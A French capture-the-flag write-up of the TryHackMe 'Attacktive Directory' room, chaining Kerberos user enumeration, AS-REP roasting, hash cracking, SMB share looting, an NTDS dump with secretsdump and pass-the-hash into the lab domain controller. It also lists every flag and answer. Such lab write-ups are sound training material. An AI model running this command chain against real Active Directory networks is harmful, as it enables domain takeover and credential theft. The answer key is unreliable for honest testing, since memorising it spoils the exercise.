# TryHackMe: Attacktive Directory

**Objectif :** enumerer un controleur de domaine Active Directory, identifier le domaine cible et des comptes interessants, realiser un AS-REP Roasting sur un compte vulnerables, reutiliser les identifiants trouves pour parcourir les shares SMB, recuperer des credentials de sauvegarde, executer un dump `NTDS.DIT` via `secretsdump`, puis terminer par un pass-the-hash en tant qu'Administrateur.

---

## Introduction

La room **Attacktive Directory** est une tres bonne introduction pratique a l'exploitation d'un domaine Active Directory. Elle ne repose pas sur une seule faille, mais sur une suite de techniques classiques :

- enumeration reseau et SMB
- identification du nom de domaine
- enumeration Kerberos avec `kerbrute`
- AS-REP Roasting
- cassage de hash hors ligne
- enumeration de shares SMB
- reutilisation d'identifiants
- DCSync / dump NTDS via `secretsdump`
- pass-the-hash avec Evil-WinRM

Le vrai interet de la room vient de la progression logique entre ces etapes. Chaque credential ouvre le palier suivant.

---

## Task 1: Deploy the machine

### Question 1: Deploy the machine

Je deploie la machine depuis la room et j'attends qu'elle soit disponible avant toute interaction.

### Reponse

`Done`

---

## Task 2: Setup

Cette tache rappelle surtout la preparation de l'environnement :

- ouvrir le VPN TryHackMe
- ajouter eventuellement le domaine dans `/etc/hosts`
- preparer les outils de la room

### Reponse

`Done`

---

## Task 3: Welcome to Attacktive Directory

### Enumeration initiale

Je commence avec un scan Nmap :

```bash
nmap -Pn -sC -sV <IP>
```

Sur un controleur de domaine, on retrouve typiquement :

- DNS
- Kerberos
- LDAP
- SMB
- RPC
- WinRM

Les resultats donnent aussi plusieurs informations critiques :

- le domaine DNS : `spookysec.local`
- le NetBIOS / domaine AD : `THM-AD`

### Question 1: What tool will allow us to enumerate port 139/445?

Le tool attendu par la room est :

```text
enum4linux
```

### Reponse

**Tool to enumerate 139/445:** `enum4linux`

### Question 2: What is the NetBIOS name of the machine?

Les resultats Nmap remontent le nom :

```text
THM-AD
```

### Reponse

**NetBIOS name:** `THM-AD`

### Question 3: What invalid TLD do people commonly use for Active Directory Domain Services?

La question fait reference a l'usage historique, incorrect, mais courant de :

```text
.local
```

### Reponse

**Invalid TLD:** `.local`

---

## Task 4: Enumerating Users via Kerberos

La room fait telecharger `kerbrute` et une userlist. Le but est de trouver quels comptes existent dans le domaine.

### Preparation

```bash
./kerbrute_linux_amd64 userenum -d spookysec.local --dc <IP> userlist.txt
```

### Question 1: What command within Kerbrute will allow us to enumerate valid usernames?

La sous-commande attendue est :

```text
userenum
```

### Reponse

**Kerbrute command:** `userenum`

### Question 2: What notable account is discovered? (These should jump out at you)

L'enumeration fait ressortir plusieurs comptes, mais le premier qui attire l'attention est :

```text
svc-admin
```

### Reponse

**Notable account:** `svc-admin`

### Question 3: What is the other notable account is discovered? (These should jump out at you)

L'autre compte important est :

```text
backup
```

### Reponse

**Other notable account:** `backup`

---

## Pourquoi `svc-admin` et `backup` sont interessants

Ces deux comptes sortent du lot pour une raison simple :

- `svc-admin` ressemble a un compte de service
- `backup` ressemble a un compte technique a privileges

Sur un AD reel, ce sont justement le type de comptes qu'on cible en priorite :

- parce qu'ils sont souvent mal configures
- parce qu'ils possedent des droits utiles
- parce qu'ils reutilisent parfois des mots de passe faibles

---

## Task 5: Abusing Kerberos

Cette partie s'appuie sur **AS-REP Roasting**.

Le principe :

- un compte AD peut etre configure avec "Do not require Kerberos preauthentication"
- dans ce cas, on peut demander un ticket AS-REP sans connaitre le mot de passe
- le ticket recupere peut ensuite etre casse hors ligne

### Question 1: Which user account can you query a ticket from with no password?

En utilisant `GetNPUsers.py`, le compte vulnerable est :

```text
svc-admin
```

Commande typique :

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip <IP>
```

### Reponse

**AS-REP roastable user:** `svc-admin`

### Question 2: Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

La sortie commence par :

```text
$krb5asrep$23$
```

Le type complet attendu par la room est :

```text
Kerberos 5, etype 23, AS-REP
```

### Reponse

**Kerberos hash type:** `Kerberos 5, etype 23, AS-REP`

### Question 3: What mode is the hash?

Dans Hashcat, ce format correspond au mode :

```text
18200
```

### Reponse

**Hashcat mode:** `18200`

### Question 4: Now crack the hash with the modified password list provided, what is the user accounts password?

Je sauvegarde le hash dans un fichier, puis j'utilise Hashcat avec la wordlist fournie par la room :

```bash
hashcat -m 18200 hash.txt passwordlist.txt
hashcat -m 18200 hash.txt passwordlist.txt --show
```

Le mot de passe de `svc-admin` est :

```text
management2005
```

### Reponse

**svc-admin password:** `management2005`

---

## Task 6: Back to the Basics

Maintenant que j'ai un couple valide :

- `svc-admin`
- `management2005`

je peux revenir sur SMB pour faire une enumeration authentifiee.

### Question 1: What utility can we use to map remote SMB shares?

L'outil attendu par la room est :

```text
smbclient
```

### Reponse

**Utility to map SMB shares:** `smbclient`

### Question 2: Which option will list shares?

Avec `smbclient`, l'option pour lister les shares est :

```text
-L
```

### Reponse

**Option to list shares:** `-L`

### Question 3: How many remote shares is the server listing?

Commande :

```bash
smbclient -L //spookysec.local/ -U spookysec.local/svc-admin%management2005
```

Je retrouve **6 shares** :

- `ADMIN$`
- `backup`
- `C$`
- `IPC$`
- `NETLOGON`
- `SYSVOL`

### Reponse

**Number of shares:** `6`

### Question 4: There is one particular share that we have access to that contains a text file. Which share is it?

Le share accessible et interessant est :

```text
backup
```

### Reponse

**Interesting share:** `backup`

### Question 5: What is the content of the file?

Je m'y connecte :

```bash
smbclient //spookysec.local/backup -U spookysec.local/svc-admin%management2005
```

Puis :

```bash
get backup_credentials.txt
```

Le contenu brut du fichier est :

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

### Reponse

**File content:** `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

### Question 6: Decoding the contents of the file, what is the full contents?

Je decode la valeur Base64 :

```bash
echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
```

Resultat :

```text
backup@spookysec.local:backup2517860
```

### Reponse

**Decoded content:** `backup@spookysec.local:backup2517860`

---

## Task 7: Elevating Privileges within the Domain

Nous avons maintenant un second compte :

- `backup`
- `backup2517860`

Ce compte permet d'aller plus loin que `svc-admin`.

### Dump des secrets AD

J'utilise `secretsdump.py` d'Impacket :

```bash
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@<IP>
```

La methode employee ici est `DRSUAPI`, c'est-a-dire un abus des mecanismes de replication AD.

### Question 1: What method allowed us to dump NTDS.DIT?

### Reponse

**Method used to dump NTDS.DIT:** `DRSUAPI`

### Question 2: What is the Administrators NTLM hash?

Dans la sortie de `secretsdump`, le hash NTLM de l'Administrateur est :

```text
0e0363213e37b94221497260b0bcb4fc
```

### Reponse

**Administrator NTLM hash:** `0e0363213e37b94221497260b0bcb4fc`

### Question 3: What method of attack could allow us to authenticate as the user without the password?

Ici, on va reutiliser directement le hash NTLM sans connaitre le mot de passe en clair. La technique s'appelle :

```text
pass the hash
```

### Reponse

**Method of attack:** `pass the hash`

### Question 4: Using a tool called Evil-WinRM what option will allow us to use a hash?

L'option attendue est :

```text
-H
```

### Reponse

**Evil-WinRM option:** `-H`

---

## Task 8: Flag Submission Panel

Maintenant que j'ai le hash administrateur, je peux ouvrir un shell WinRM :

```bash
evil-winrm -i <IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Une fois connecte, il ne reste plus qu'a lire les trois flags demandes dans la room.

### Question 1: svc-admin

### Reponse

**svc-admin flag:** `TryHackMe{K3rb3r0s_Pr3_4uth}`

### Question 2: backup

### Reponse

**backup flag:** `TryHackMe{B4ckM3UpSc0tty!}`

### Question 3: Administrator

### Reponse

**Administrator flag:** `TryHackMe{4ctiveD1rectoryM4st3r}`

---

## Resume des reponses de la room

- Deploy the machine `Done`
- Setup `Done`
- What tool will allow us to enumerate port 139/445? `enum4linux`
- What is the NetBIOS name of the machine? `THM-AD`
- What invalid TLD do people commonly use for Active Directory Domain Services? `.local`
- What command within Kerbrute will allow us to enumerate valid usernames? `userenum`
- What notable account is discovered? `svc-admin`
- What is the other notable account is discovered? `backup`
- Which user account can you query a ticket from with no password? `svc-admin`
- What type of Kerberos hash did we retrieve from the KDC? `Kerberos 5, etype 23, AS-REP`
- What mode is the hash? `18200`
- What is the user accounts password? `management2005`
- What utility can we use to map remote SMB shares? `smbclient`
- Which option will list shares? `-L`
- How many remote shares is the server listing? `6`
- Which share contains the text file? `backup`
- What is the content of the file? `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
- Decoded full contents? `backup@spookysec.local:backup2517860`
- What method allowed us to dump NTDS.DIT? `DRSUAPI`
- What is the Administrators NTLM hash? `0e0363213e37b94221497260b0bcb4fc`
- What method of attack could allow us to authenticate as the user without the password? `pass the hash`
- Using Evil-WinRM what option will allow us to use a hash? `-H`
- svc-admin `TryHackMe{K3rb3r0s_Pr3_4uth}`
- backup `TryHackMe{B4ckM3UpSc0tty!}`
- Administrator `TryHackMe{4ctiveD1rectoryM4st3r}`

---

## Commandes importantes

### Enumeration Kerberos

```bash
./kerbrute_linux_amd64 userenum -d spookysec.local --dc <IP> userlist.txt
```

Permet d'identifier rapidement les comptes valides sans mot de passe.

### AS-REP Roasting

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip <IP>
```

Recupere un hash cassable hors ligne pour `svc-admin`.

### Crack du hash

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

Transforme un ticket Kerberos en mot de passe exploitable.

### Enumeration SMB authentifiee

```bash
smbclient -L //spookysec.local/ -U spookysec.local/svc-admin%management2005
```

Expose le share `backup`.

### Dump DCSync / NTDS

```bash
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@<IP>
```

Recupere les hashes AD a partir du compte `backup`.

### Pass-the-hash

```bash
evil-winrm -i <IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Termine la chaine en ouvrant une session administrateur.

---

## Raisonnement complet

La room est tres bien construite parce que chaque credential prepare le suivant :

1. Nmap et SMB donnent le contexte AD
2. `kerbrute` valide des comptes existants
3. `svc-admin` se revele roastable
4. le hash casse donne un mot de passe valide
5. ce mot de passe ouvre le share `backup`
6. le share donne un second credential plus puissant
7. `backup` permet un dump `NTDS.DIT`
8. le hash administrateur sert ensuite au pass-the-hash

On voit donc parfaitement comment une faiblesse Kerberos peut conduire a la compromission totale du domaine.

---

## Conclusion

**Attacktive Directory** est une excellente room d'introduction a l'AD offensif. Elle force a manipuler les grands classiques du domaine sans tomber dans la complexite inutile, et elle montre tres bien comment des comptes techniques mal proteges peuvent mener a la maitrise complete du controleur de domaine.

***Auteur*** *: Saad Idrissi*
